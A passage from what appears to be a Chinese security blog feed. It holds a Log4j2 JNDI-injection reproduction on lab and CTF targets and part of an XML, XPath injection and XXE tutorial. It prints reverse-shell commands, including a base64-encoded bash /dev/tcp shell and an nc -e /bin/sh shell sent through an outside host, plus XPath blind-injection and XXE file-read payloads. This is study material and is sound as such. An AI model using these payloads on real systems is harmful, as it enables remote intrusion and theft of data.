        <content type="html"><![CDATA[<p>之前只是简略看了看这个漏洞，但是并没有及时复现，但是发现这个漏洞hw问的很多，所以还是及时复现一下吧。</p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j2</a> 是 Apache 软件基金会下的一个<a href="https://github.com/apache/logging-log4j2">开源</a>的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。</p><p>2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 <code>$&#123;&#125;</code> 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p><p>漏洞编号：<a href="https://www.cve.org/CVERecord?id=CVE-2021-44228">CVE-2021-44228</a></p><p>- 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。<br>- 严重等级：Critical<br>- Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br>- 影响版本：all versions from 2.0-beta9 to 2.14.1</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于本人代码功底有限，就大概说明下，不进行代码跟进了。</p><p>log4j2提供了一种叫<code>lookups</code>的功能来写日志</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/webp.webp" alt="img"></p><p>而漏洞成因就是log4j2支持<code>Jndi Lookup</code></p><p>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2将基本的解析都做了实现：</p><p><img src="https://upload-images.jianshu.io/upload_images/27307869-0dd3def6ff8e3f96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/976/format/webp" alt="img"></p><p>常见解析：</p><pre><code>$&#123;ctx:loginId&#125;$&#123;map:type&#125;$&#123;filename&#125;$&#123;date:MM-dd-yyyy&#125;$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;$&#123;docker:imageName&#125;$&#123;env:USER&#125;$&#123;event:Marker&#125;$&#123;mdc:UserId&#125;$&#123;java&#125;$&#123;jndi:logging/context-name&#125;$&#123;hostName&#125;$&#123;docker:containerId&#125;$&#123;k8s&#125;$&#123;log4j&#125;$&#123;main&#125;$&#123;name&#125;$&#123;marker&#125;$&#123;spring&#125;$&#123;sys:logPath&#125;$&#123;web:rootDir&#125;</code></pre><p>JNDI就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象,如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p><p>也就是当记录日志的一部分是用户可控时(比如输入用户名和密码时)，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p><p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p><h1 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h1><p><strong>环境1 失败</strong></p><p>环境:<a href="http://vulfocus.io/">http://vulfocus.io/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225000889.png" alt="image-20220423225000889"></p><p>测试一下是否存在log4j2,使用网站:<a href="http://dnslog.cn/">http://dnslog.cn/</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230017138.png" alt="image-20220423230017138"></p><pre><code>xxxx?payload=$&#123;jndi:ldap://37zwcc.dnslog.cn/exp&#125;</code></pre><p>有个很重要一点，要对特殊字符进行url编码</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225440706.png" alt="image-20220423225440706"></p><p>成功回显，证明有漏洞</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230128737.png" alt="image-20220423230128737"></p><p>在vps上运行jndi注入工具:</p><p>链接:<a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230550825.png" alt="image-20220423230550825"></p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDguMTY2LjIwMS4xNi82NjY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;108.166.xx.xx&quot;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231525347.png" alt="image-20220423231525347"></p><p>nc监听:</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231620210.png" alt="image-20220423231620210"></p><p>构造payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/xodh7q&#125;</code></pre><p>还是进行url编码</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000703924.png" alt="image-20220424000703924"></p><p>按理说就可以了，但是我在这个环境并没有成功</p><p><strong>环境2 成功</strong></p><p>感觉上面的环境有点问题，一直无法反弹shell，无论是bin/bash 还是nc都反弹失败了，下面采用bugku环境复现</p><p>url:<a href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000909413.png" alt="image-20220424000909413"></p><p>打一下poc，测试下是否存在漏洞</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001013346.png" alt="image-20220424001013346"></p><p>ojbk，回显了</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001036572.png" alt="image-20220424001036572"></p><p>在Linux上启动服务</p><pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc 108.166.xx.xx 4444 -e /bin/sh&quot; -A 108.166.xx.xx</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001128315.png" alt="image-20220424001128315"></p><p>直接构造payload</p><pre><code>$&#123;jndi:rmi://108.166.201.16:1099/dwqsay&#125;</code></pre><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000441276.png" alt="image-20220424000441276"></p><p>成功反弹shell</p><p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000428361.png" alt="image-20220424000428361"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> log4j2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞学习</title>
      <link href="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>自己对这个漏洞不懂原理，以及不会深入利用，就看看师傅的文章，搬运顺便复现部分场景吧。</p><p>[TOC]</p><h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p><strong>什么是XML</strong></p><p> XML 指可扩展标记语言（EXtensible Markup Language）。<br> XML 的设计宗旨是传输数据，而不是显示数据。<br> XML 是 W3C 的推荐标准。<br> XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br> XML 语言没有预定义的标签。</p><p><strong>XML和HTML的区别</strong></p><p> XML 被设计用来传输和存储数据，其焦点是数据的内容。<br> HTML 被设计用来显示数据，其焦点是数据的外观。<br> HTML 旨在显示信息，而 XML 旨在传输信息。</p><p><strong>XML被用来做什么</strong></p><p>现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。</p><p><strong>XML基本格式</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt;&lt;bookstore&gt;                                                 &lt;!--根元素--&gt;&lt;book category=&quot;COOKING&quot;&gt;        &lt;!--bookstore的子元素，category为属性--&gt;&lt;title&gt;Everyday Italian&lt;/title&gt;           &lt;!--book的子元素，lang为属性--&gt;&lt;author&gt;Giada De Laurentiis&lt;/author&gt;                  &lt;!--book的子元素--&gt;&lt;year&gt;2005&lt;/year&gt;                                     &lt;!--book的子元素--&gt;&lt;price&gt;30.00&lt;/price&gt;                                  &lt;!--book的子元素--&gt;&lt;/book&gt;                                                 &lt;!--book的结束--&gt;&lt;/bookstore&gt;                                       &lt;!--bookstore的结束--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</code></pre><p><strong>基本语法</strong></p><ul><li>所有 XML 元素都须有关闭标签。</li><li>XML 标签对大小写敏感。</li><li>XML 必须正确地嵌套。</li><li>XML 文档必须有根元素。</li><li>XML 的属性值须加引号。</li></ul><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><p><strong>基本概念</strong></p><p> XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br> DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><p><strong>实体引用</strong></p><pre><code class="xml">XML元素以形如 &lt;tag&gt;foo&lt;/tag&gt; 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 &lt; &gt; &amp; &#39; &quot; 。实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。</code></pre><p><strong>示例代码</strong></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;note&gt;&lt;to&gt;Y0u&lt;/to&gt;&lt;from&gt;@re&lt;/from&gt;&lt;head&gt;v3ry&lt;/head&gt;&lt;body&gt;g00d!&lt;/body&gt;&lt;/note&gt;PCDATAPCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用&amp;amp; &amp;lt; &amp;gt;实体来分别替换。CDATACDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</code></pre><p><strong>DTD元素</strong></p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150727-65e7882a-14d2-1.png" alt="img"></p><h1 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h1><blockquote><p> 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。<br> 实体引用是对实体的引用。<br> 实体可在内部或外部进行声明。</p></blockquote><p><em>按实体有无参分类，实体分为一般实体和参数实体</em></p><pre><code class="xml">一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;引用一般实体的方法：&amp;实体名称;经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;引用参数实体的方法：%实体名称;经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</code></pre><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>按实体使用方式分类，实体分为内部声明实体和引用外部实体</p><p><strong>内部实体</strong></p><pre><code class="xml">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></pre><p><strong>内部实体示例代码：</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY writer &quot;Dawn&quot;&gt;    &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;]&gt;&lt;test&gt;&amp;writer;©right;&lt;/test&gt;</code></pre><p><strong>外部实体</strong></p><p>外部实体，用来引入外部资源。有<code>SYSTEM</code>和<code>PUBLIC</code>两个关键字，表示实体来自本地计算机还是公共计算机。</p><pre><code class="xml">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;或者&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></pre><p><strong>外部实体示例代码:</strong></p><pre><code class="xml">&lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;    &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;]&gt;&lt;author&gt;&amp;file;©right;&lt;/author&gt;</code></pre><p>外部实体可支持http、file等协议。不同程序支持的协议不同：</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202150935-b26e4a30-14d2-1.png" alt="img"></p><p> PHP支持的协议会更多一些，但需要一定的扩展：</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202151023-cf02c3ba-14d2-1.png" alt="img"></p><p><strong>PHP引用外部实体，常见的利用协议</strong>：</p><pre><code class="xml">file://文件绝对路径 如：file:///etc/passwdhttp://url/file.txtphp://filter/read=convert.base64-encode/resource=xxx.php</code></pre><p><strong>参数实体+外部实体</strong></p><pre><code class="xml">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></pre><p>示例代码：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test [  &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  %file;]&gt;%file(参数实体)是在DTD中被引用的，而&amp;file;是在xml文档中被引用的。</code></pre><h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><blockquote><p> XML的设计宗旨是传输数据，而非显示数据。<br> XML注入是一种古老的技术，通过利用闭合标签改写XML文件实现的。</p></blockquote><p><strong>XML注入简介</strong></p><p> XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。</p><p><strong>XML注入前提</strong></p><p> （1）用户能够控制数据的输入<br> （2）程序有拼凑的数据</p><p><strong>案例演示</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;username&gt;admin&lt;/username&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>对于上面的xml文件，如果攻击者能够掌控password字段，那么就会产生XML注入。如攻击者输入：</p><pre><code class="xml">root&lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;username&gt;hack&lt;/username&gt;&lt;password&gt;hacker    # 在原文中给出的是 admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt;，我觉得这样不对，当然也有可能是我想错了，先填坑吧</code></pre><p>那么上述代码就会变为</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manager&gt;    &lt;admin id=&quot;1&quot;&gt;    &lt;name&gt;admin&lt;/name&gt;    &lt;password&gt;admin&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;2&quot;&gt;    &lt;username&gt;root&lt;/username&gt;    &lt;password&gt;root&lt;/password&gt;    &lt;/admin&gt;    &lt;admin id=&quot;3&quot;&gt;    &lt;name&gt;hack&lt;/name&gt;    &lt;password&gt;hacker&lt;/password&gt;    &lt;/admin&gt;&lt;/manager&gt;</code></pre><p>这样就通过XML注入添加了一个名为hack、密码为：hacker的管理员账户。<br> XML注入两大要素：<strong>标签闭合和获取XML表结构</strong></p><p><strong>XML注入防御</strong></p><p> （1）对用户的输入进行过滤<br> （2）对用户的输入进行转义</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/20191202152614-05da2f0c-14d5-1.jpg" alt="img"></p><h1 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h1><p><strong>Xpath注入简介</strong></p><p>XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath  查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。</p><p>XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。</p><p><strong>Xpath攻击特点</strong></p><p>XPath注入攻击利用两种技术，即<strong>XPath扫描</strong>和 <strong>XPath查询布尔化</strong>。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。</p><p>XPath注入攻击同SQL注入攻击类似，但与SQL注入相比，XPath具有的优势：</p><ol><li>广泛性<br> 只要是利用XPath语法的Web 应用程序若未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。而在SQL注入攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。</li><li>危害性大<br> XPath语言几乎可以没有访问控制限制的引用XML文档的所有部分。而在SQL注入中，一个“<code>用户</code>”的权限可能被限制到 某一特定的表、列或者查询。<br> XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的安全漏洞，即可构造针对 XPath应用的自动攻击。</li></ol><p><strong>XPath注入攻击原理与应用</strong></p><p>XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。<br> 注入对象不是数据库users表，而是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是<code>cookie</code>，<code>headers</code>，<code>request</code> <code>parameters/input</code>等。</p><p> 首先要去了解xPath基础语法—–&gt;  <a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></p><p>如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。</p><p>Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。</p><p><strong>XPath直接注入</strong></p><p>test.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;    &lt;users&gt;         &lt;user&gt;             &lt;id&gt;1&lt;/id&gt;            &lt;username&gt;test1&lt;/username&gt;            &lt;password&gt;test1&lt;/password&gt;        &lt;/user&gt;         &lt;user&gt;             &lt;id&gt;2&lt;/id&gt;            &lt;username&gt;test2&lt;/username&gt;            &lt;password&gt;test2&lt;/password&gt;        &lt;/user&gt;    &lt;/users&gt;&lt;/root&gt;</code></pre><p>test.php(用于接受传入参数，并进行xml查询)</p><pre><code class="php">&lt;?php$xml=simplexml_load_file(&#39;test.xml&#39;);$name=$_GET[&#39;name&#39;];$pwd=$_GET[&#39;pwd&#39;];$query=&quot;/root/users/user[username/text()=&#39;&quot;.$name.&quot;&#39; and password/text()=&#39;&quot;.$pwd.&quot;&#39;]&quot;;echo $query;$result=$xml-&gt;xpath($query);if($result)&#123;    echo &#39;&lt;h2&gt;Welcome&lt;/h2&gt;&#39;;    foreach($result as $key=&gt;$value)&#123;        echo &#39;&lt;br /&gt;ID:&#39;.$value-&gt;id;        echo &#39;&lt;br /&gt;Username:&#39;.$value-&gt;username;        echo &#39;&lt;br /&gt;Password:&#39;.$value-&gt;password;    &#125;&#125;?&gt;</code></pre><p><strong><a href="http://www.w3school.com.cn/php/func_simplexml_load_file.asp"><code>simplexml_load_file()</code>函数</a></strong><br> 返回类 SimpleXMLElement 的一个对象，该对象的属性包含 XML 文档中的数据</p><p>我们先传入正常参数</p><pre><code>http://127.0.0.1/test.php?name=test1&amp;pwd=test1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230048387.png" alt="image-20220421230048387"></p><p>成功返回了我们需要的值</p><p>如果我们在username中输入恶意的值，比如</p><pre><code>&#39; or 1=1 or &#39;&#39; = &#39;</code></pre><p>那么我们的XPath查询语句就变为</p><pre><code>/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39; = &#39;&#39; and password/text()=&#39;test1&#39;] #and的优先级高于or</code></pre><p>我们看出现了什么情况</p><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421230408461.png" alt="image-20220421230408461"></p><p>这个语句导致了什么呢？就是所有的user元素都满足要求</p><p>上面这个字符串会在逻辑上使查询一直返回 true，并将一直允许攻击者访问系统</p><p>攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲注技术获取最高权限帐号和其它重要文档信息。</p><p><strong>XPath盲注</strong></p><p>如果想要构造恶意语句遍历出整个XML文档，一般步骤如下：</p><p>1.盲注根节点</p><p>利用count（/*）判断根下节点：</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421233640335.png" alt="image-20220421233640335"></p><p>这条语句的作用是什么呢？我们来刨析下</p><pre><code>/root/users/user[username/text()=&#39;&#39; or count(/*) = 1 or &#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>对于这个XPath语句，首先执行and语句</p><pre><code>&#39;1&#39;=&#39;2&#39; and password/text()=&#39;1&#39;]</code></pre><p>这条恒为假</p><p>然后</p><pre><code>username/text()=&#39;&#39; or count(/*) = 1</code></pre><p>这条在根节点为1的时候为真，不是1就为假</p><p>然后简化一下</p><pre><code>真/假 or 假</code></pre><p>我们发现，判断这条语句是否为真的关键点是</p><pre><code>count(/*) = 1</code></pre><p>当根节点为1时，就可以选出所以user元素，不是1时，就无法选出，由此就可以判断根节点个数</p><p>仅仅判断了个数是不够的，还要知道它是什么字符才可以，可以使用substring分割根节点的每个字符，猜解第一级节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/*[position() = 1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421234716211.png" alt="image-20220421234716211"></p><p>根据这样的原理写一个脚本就ok了</p><p>2.盲注root的下一级节点</p><p>判断root是否有下一级(1个)节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or count(/root/*) = 1 or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p>同理猜解root下一级节点</p><pre><code>http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;2&amp;pwd=1http://127.0.0.1/test.php?name=&#39; or substring(name(/root/*[position() = 1]),2,1)=&#39;s&#39; or &#39;1&#39;=&#39;2&amp;pwd=1</code></pre><p><img src="/2022/04/19/xxe%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220421235135999.png" alt="image-20220421235135999"></p><p>一直按照这样的步骤往下即可</p><p><strong>XPath注入危害</strong></p><ul><li>在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据。</li><li>可通过此类漏洞查询获取到系统内部完整的XML文档内容。</li><li>逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。</li></ul><p><strong>XPath注入防御</strong></p><ol><li>数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。</li><li>检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串。</li><li>对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息。</li><li>参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。</li><li>通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。</li></ol><h1 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h1><p><strong>XXE漏洞简介</strong></p><p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br> XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br> XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><p>解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。<br> <a href="https://www.runoob.com/php/func-simplexml-load-string.html">simplexml_load_string()</a>可以读取XML</p><p><strong>本地环境搭建</strong></p><p>test.php</p><pre><code class="php">&lt;?php$xmlfile=file_get_contents(&#39;php://input&#39;);$dom=new DOMDocument();$dom-&gt;loadXML($xmlfile);$xml=simplexml_import_dom($dom);$xxe=$xml-&gt;xxe;$str=&quot;$xxe \n&quot;;echo $str;?&gt;</code></pre><ul><li><code>file_get_contents</code>获取客户端输入内容</li><li><code>new DOMDocument()</code>初始化XML解析器</li><li><code>loadXML($xmlfile)</code>加载客户端输入的XML内容</li><li><code>simplexml_import_dom($dom)</code>获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。</li><li>获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容。</li></ul><p>payload</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [&lt;!ENTITY file SYSTEM &quot;file:///E:/phpstudy_pro/WWW/flag.txt&quot;&gt;]&gt;&lt;xml&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&lt;/xml&gt;</code></pre><p><img 